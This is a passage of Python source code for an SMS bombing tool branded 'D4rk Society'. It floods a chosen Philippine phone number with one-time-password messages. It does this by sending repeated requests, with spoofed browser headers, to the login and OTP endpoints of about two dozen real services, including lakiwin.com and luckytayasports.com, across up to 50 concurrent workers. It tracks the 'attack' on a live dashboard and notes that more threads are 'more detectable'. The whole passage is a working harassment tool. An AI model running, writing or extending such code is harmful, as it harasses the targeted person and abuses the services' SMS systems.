                "device-token": "xEnYLR+wpdTKOKvxEiPJjF3GPdPBXpQY07IlYzzh2Vte9wAs7JGCi0qFD4Zl609e",
                "sec-ch-ua-platform": "Android",
                "ocms-col": "FALSE",
                "req-trace-key": "3c86b3ea-ed4a-4b1f-bde5-3c3754f52bd2",
                "sec-ch-ua": "Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Brave\";v=\"144\"",
                "sec-ch-ua-mobile": "?1",
                "ocms-timezone": "Asia/Manila",
                "content-type": "application/json;charset=UTF-8",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.5",
                "origin": "https://www.lakiwin.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.lakiwin.com/",
                "cookie": "visid_incap_3138262=4ENPcAimRaCcYh+v6BJ+kyGxhmkAAAAAQUIPAAAAAACCxqUFtmXEkWYu2FIPWvKi; incap_ses_1637_3138262=p4qsC9aklEnnF+IPVsu3FoAOkGkAAAAAj1qzZhN2Brk/M+MBiEuboQ==; lang=en",
                "priority": "u=1, i",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Connection": "keep-alive"
            }

            payload = {
                "phoneNumber": formatted_phone,
                "otpType": "LOGIN_OTP"
            }

            async with session.post(
                "https://www.lakiwin.com/service/mobile/check",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                status = response.status
                if status in [200, 201, 202, 204]:
                    return True
                else:
                    try:
                        response_text = await response.text()
                        if "success" in response_text.lower() or "otp" in response_text.lower() or "sent" in response_text.lower():
                            return True
                    except:
                        pass
                    return False

        except Exception as e:
            return False

    # ============ NEW SERVICE: LUCKYTAYA SPORTS ============
    async def send_luckytaya(self, session, phone_number):
        try:
            # Format the phone number to +63XXXXXXXXXX format
            formatted_phone = self.format_number(phone_number)
            
            headers = {
                "sec-ch-ua-platform": "Android",
                "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                "dnt": "1",
                "sec-ch-ua-mobile": "?1",
                "sec-gpc": "1",
                "accept-language": "en-US,en;q=0.8",
                "origin": "https://luckytayasports.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://luckytayasports.com/",
                "priority": "u=1, i",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
                "Accept": "application/json, text/plain, */*",
                "Connection": "keep-alive"
            }

            payload = {
                "phone": formatted_phone
            }

            async with session.post(
                "https://luckytayasports.com/api/auth/otp",
                headers=headers,
                json=payload,
                timeout=10
            ) as response:
                status = response.status
                if status in [200, 201, 202, 204]:
                    return True
                else:
                    try:
                        response_text = await response.text()
                        if "success" in response_text.lower() or "otp" in response_text.lower() or "sent" in response_text.lower():
                            return True
                    except:
                        pass
                    return False

        except Exception as e:
            return False

class SMSAttackManager:
    def __init__(self):
        self.bomber = SMSBomber()
        self.active_attacks = {}
        self.attack_id_counter = 1
        self.display_lock = threading.Lock()
        self.service_history = []
        self.banner_color_index = 0
        self.banner_colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
        
    def get_next_banner_color(self):
        self.banner_color_index = (self.banner_color_index + 1) % len(self.banner_colors)
        return self.banner_colors[self.banner_color_index]
        
    def show_banner(self):
        banner_color = self.get_next_banner_color()
        banner = f"""{banner_color}
                                                                                                                   
:'######:::'#######:::'######::'##::::'##:'####::'######::
'##... ##:'##.... ##:'##... ##: ###::'###:. ##::'##... ##:
 ##:::..:: ##:::: ##: ##:::..:: ####'####:: ##:: ##:::..::
 ##::::::: ##:::: ##:. ######:: ## ### ##:: ##:: ##:::::::
 ##::::::: ##:::: ##::..... ##: ##. #: ##:: ##:: ##:::::::
 ##::: ##: ##:::: ##:'##::: ##: ##:.:: ##:: ##:: ##::: ##:
. ######::. #######::. ######:: ##:::: ##:'####:. ######::
:......::::.......::::......:::..:::::..::....:::......:::                                            
 D4rk Society                                           
"""
        print(banner)
        
    def get_input(self):
        print(f"\n{Fore.CYAN}[1/3] Enter target phone number:")
        print(f"{Fore.YELLOW}Formats: 09171234567, 9171234567, +639171234567")
        print(f"{Fore.WHITE}>>> ", end="")
        
        while True:
            number = input().strip()
            validated = self.bomber.validate_number(number)
            if validated:
                print(f"{Fore.GREEN}✓ Valid number: {validated}")
                break
            else:
                print(f"{Fore.RED}✗ Invalid format. Try again:")
                print(f"{Fore.WHITE}>>> ", end="")
        
        print(f"\n{Fore.CYAN}[2/3] Enter attack duration (seconds):")
        print(f"{Fore.YELLOW}Example: 60 = 1 minute, 300 = 5 minutes")
        print(f"{Fore.WHITE}>>> ", end="")
        
        while True:
            try:
                duration = int(input().strip())
                if duration > 0:
                    break
                else:
                    print(f"{Fore.RED}✗ Must be positive. Try again:")
                    print(f"{Fore.WHITE}>>> ", end="")
            except:
                print(f"{Fore.RED}✗ Must be a number. Try again:")
                print(f"{Fore.WHITE}>>> ", end="")
        
        print(f"\n{Fore.CYAN}[3/3] Enter number of threads (1-50):")
        print(f"{Fore.YELLOW}More threads = faster but more detectable")
        print(f"{Fore.WHITE}>>> ", end="")
        
        while True:
            try:
                threads = int(input().strip())
                if 1 <= threads <= 50:
                    break
                else:
                    print(f"{Fore.RED}✗ Must be 1-50. Try again:")
                    print(f"{Fore.WHITE}>>> ", end="")
            except:
                print(f"{Fore.RED}✗ Must be a number. Try again:")
                print(f"{Fore.WHITE}>>> ", end="")
        
        return validated, duration, threads
    
    def update_dashboard(self, attack_id, number, batch_num, service_results=None):
        with self.display_lock:
            if attack_id not in self.active_attacks or not self.active_attacks[attack_id]['running']:
                return
            
            info = self.active_attacks[attack_id]
            elapsed = time.time() - info['start_time']
            remaining = info['duration'] - elapsed

            print(f"\033[12;0H╔══════════════════════════════════════════╗\033[K")
            print(f"\033[13;0H║           ATTACK IN PROGRESS             ║\033[K")
            print(f"\033[14;0H╚══════════════════════════════════════════╝{Fore.RESET}\033[K")
            
            print(f"\033[15;0H{Fore.YELLOW}Target: {Fore.CYAN}{number}\033[K")
            print(f"\033[16;0H{Fore.YELLOW}Duration: {Fore.CYAN}{info['duration']}s {Fore.YELLOW}| Elapsed: {Fore.CYAN}{elapsed:.1f}s\033[K")
            print(f"\033[17;0H{Fore.YELLOW}Remaining: {Fore.CYAN}{max(0, remaining):.1f}s {Fore.YELLOW}| Batches: {Fore.CYAN}{info.get('batch_count', 0)}\033[K")
            print(f"\033[18;0H{Fore.GREEN}Success: {info['total_success']} {Fore.RED}| Failed: {info['total_fail']}\033[K")
            print(f"\033[19;0H{Fore.MAGENTA}{'═'*45}{Fore.RESET}\033[K")
            
            print(f"\033[20;0H{Fore.CYAN}Current Batch: {batch_num}\033[K")
            
            if service_results:
                for i, (service_name, status, color) in enumerate(service_results[:30]):
                    line_num = 21 + i
                    symbol = '+' if status == 'Success' else '-'
                    print(f"\033[{line_num};0H{color}[{symbol}] {service_name:<20}: {status}{Fore.RESET}\033[K")
                
                for i in range(len(service_results), 8):
                    line_num = 21 + i
                    print(f"\033[{line_num};0H\033[K")
            
            print(f"\033[36;0H", end='', flush=True)
    
    async def send_batch(self, session, number, batch_num, attack_id, worker_id):
        services = [
            ("FB MEMOTION", self.bomber.send_fb_memotion),
            ("CASHALO APP", self.bomber.send_cashalo),
            ("KUMU PH", self.bomber.send_kumu_ph),
            ("BAYAD CENTER", self.bomber.send_bayad),
            ("MEGAPERYA", self.bomber.send_megaperya),
            ("KING.PH", self.bomber.send_king_ph),
            ("S5", self.bomber.send_s5),
            ("EZLOAN", self.bomber.send_ezloan),
            ("XPRESS PH", self.bomber.send_xpress_ph),
            ("ABENSON", self.bomber.send_abenson),
            ("EXCELLENT LENDING", self.bomber.send_excellent_lending),
            ("FORTUNE PAY", self.bomber.send_fortune_pay),
            ("WEMOVE", self.bomber.send_wemove),
            ("PINOY COOP", self.bomber.send_pinoy_coop),
            ("LBC CONNECT", self.bomber.send_lbc_connect),
            ("PICKUP COFFEE", self.bomber.send_pickup_coffee),
            ("LISTA SYSTEMS", self.bomber.send_lista_systems),
            ("HONEY LOAN", self.bomber.send_honey_loan),
            ("KOMO PH", self.bomber.send_komo_ph),
            ("MGAME.PH", self.bomber.send_mgame),
            ("GG PANALO", self.bomber.send_ggpanalo),
            ("GPERYA", self.bomber.send_gperya),
            ("FILBET", self.bomber.send_filbet),
            ("CASINOPLUS", self.bomber.send_casinoplus),
            ("LAKIWIN", self.bomber.send_lakiwin),
            ("LUCKYTAYA", self.bomber.send_luckytaya),
        ]

        success_count = 0
        fail_count = 0
        
        tasks = []
        for service_name, service_func in services:
            if attack_id in self.active_attacks and not self.active_attacks[attack_id]['running']:
                break
            tasks.append(self.send_service(session, service_name, service_func, number))
        
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            service_results = []
            for i, (service_name, result) in enumerate(zip([s[0] for s in services[:len(results)]], results)):
                if isinstance(result, Exception):
                    fail_count += 1
                    service_results.append((service_name, "Error", Fore.RED))
                elif result:
                    success_count += 1
                    service_results.append((service_name, "Success", Fore.GREEN))
                else:
                    fail_count += 1
                    service_results.append((service_name, "Failed", Fore.RED))
            
            self.update_dashboard(attack_id, number, batch_num, service_results)
        
        if attack_id in self.active_attacks and self.active_attacks[attack_id]['running']:
            if 'batch_count' not in self.active_attacks[attack_id]:
                self.active_attacks[attack_id]['batch_count'] = 1
            else:
                self.active_attacks[attack_id]['batch_count'] += 1
            
            self.active_attacks[attack_id]['total_success'] += success_count
            self.active_attacks[attack_id]['total_fail'] += fail_count
        
        return success_count, fail_count
    
    async def send_service(self, session, service_name, service_func, number):
        try:
            return await service_func(session, number)
        except Exception as e:
            return e
    
    async def attack_worker(self, number, duration, attack_id, worker_id):
        start_time = time.time()
        batch_count = 0
        
        connector = aiohttp.TCPConnector(limit=200, limit_per_host=40, ttl_dns_cache=60)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while time.time() - start_time < duration:
                if attack_id in self.active_attacks and not self.active_attacks[attack_id]['running']:
                    break
                    
                batch_count += 1
                await self.send_batch(session, number, f"{worker_id}-{batch_count}", attack_id, worker_id)
                
                await asyncio.sleep(0.5)
    
    async def launch_attack(self, number, duration, threads, attack_id):
        start_time = time.time()
        
        os.system('cls' if os.name == 'nt' else 'clear')
        self.show_banner()
        
        print(f"\n{Fore.LIGHTGREEN_EX}[ATTACK {attack_id} STARTED]{Fore.RESET}")
        print(f"{Fore.CYAN}Target: {number}")
        print(f"{Fore.CYAN}Duration: {duration} seconds")
        print(f"{Fore.CYAN}Threads: {threads}")
        print(f"{Fore.CYAN}Start Time: {time.strftime('%H:%M:%S')}")
        print(f"{Fore.MAGENTA}Press Ctrl+C to stop")
        print(f"{Fore.MAGENTA}{'═'*45}{Fore.RESET}")
        
        for _ in range(10):
            print()
        
        self.active_attacks[attack_id] = {
            'running': True,
            'target': number,
            'start_time': start_time,
            'duration': duration,
            'total_success': 0,
            'total_fail': 0,
            'batch_count': 0,
            'threads': []
        }
        
        self.update_dashboard(attack_id, number, "Starting...")
        
        try:
            tasks = []
            for i in range(threads):
                task = asyncio.create_task(self.attack_worker(number, duration, attack_id, i+1))
                tasks.append(task)
            
            await asyncio.gather(*tasks)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Attack {attack_id} manually stopped{Fore.RESET}")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error in attack {attack_id}: {e}{Fore.RESET}")
        
        end_time = time.time()
        elapsed = end_time - start_time
        
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id]['running'] = False
            
            total_success = self.active_attacks[attack_id]['total_success']
            total_fail = self.active_attacks[attack_id]['total_fail']
            total_requests = total_success + total_fail
            
            os.system('cls' if os.name == 'nt' else 'clear')
            self.show_banner()
            
            print(f"\n{Fore.LIGHTGREEN_EX}[ATTACK {attack_id} COMPLETED]{Fore.RESET}")
            print(f"{Fore.CYAN}Target: {number}")
            print(f"{Fore.CYAN}Elapsed Time: {elapsed:.1f} seconds")
            print(f"{Fore.CYAN}Total Batches: {self.active_attacks[attack_id]['batch_count']}")
            print(f"{Fore.GREEN}Successful sends: {total_success}")
            print(f"{Fore.RED}Failed sends: {total_fail}")
            print(f"{Fore.MAGENTA}Total requests: {total_requests}")
            print(f"{Fore.CYAN}Average rate: {total_requests/elapsed:.1f} requests/second")
            
            input(f"\n{Fore.YELLOW}Press Enter to continue...{Fore.RESET}")
            
            del self.active_attacks[attack_id]
    
    def start_attack(self, number, duration, threads):
        attack_id = self.attack_id_counter
        self.attack_id_counter += 1
        
        def run_in_thread():
            asyncio.run(self.launch_attack(number, duration, threads, attack_id))
        
        thread = threading.Thread(target=run_in_thread, daemon=True)
        thread.start()
        
        return attack_id
    
    def run(self):
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.show_banner()
            
            print(f"╔══════════════════════════════════════════╗")
            print(f"║                MAIN MENU                 ║")
            print(f"╚══════════════════════════════════════════╝{Fore.RESET}")
            print(f"{Fore.YELLOW}[1] Start new SMS attack")
            print(f"[2] Exit")
            print(f"{Fore.WHITE}>>> ", end="")
            
            choice = input().strip()
            
            if choice == "1":
                os.system('cls' if os.name == 'nt' else 'clear')
                self.show_banner()
                
                try:
                    number, duration, threads = self.get_input()
                    
                    confirm = input(f"\n{Fore.RED}Start attack? (y/n): ").strip().lower()
                    if confirm == 'y':
                        attack_id = self.start_attack(number, duration, threads)
                        print(f"\n{Fore.GREEN}Attack {attack_id} launched.")
                        time.sleep(2)
                    else:
                        print(f"{Fore.YELLOW}Attack cancelled.{Fore.RESET}")
                        time.sleep(1)
                        
                except KeyboardInterrupt:
                    print(f"\n{Fore.YELLOW}Cancelled.{Fore.RESET}")
                    time.sleep(1)
                except Exception as e:
                    print(f"\n{Fore.RED}Error: {e}{Fore.RESET}")
                    time.sleep(2)
            
            elif choice == "2":
                os.system('cls' if os.name == 'nt' else 'clear')
                self.show_banner()
                
                if self.active_attacks:
                    confirm = input(f"\n{Fore.RED}There are active attacks. Really exit? (y/n): ").strip().lower()
                    if confirm != 'y':
                        continue
                print(f"\n{Fore.CYAN}Exiting...{Fore.RESET}")
                break
            
            else:
                print(f"\n{Fore.RED}Invalid choice.{Fore.RESET}")
                time.sleep(1)

def main():
    try:
        manager = SMSAttackManager()
        manager.run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.CYAN}Program terminated by user.{Fore.RESET}")
    except Exception as e:
        print(f"\n{Fore.RED}Fatal error: {e}{Fore.RESET}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()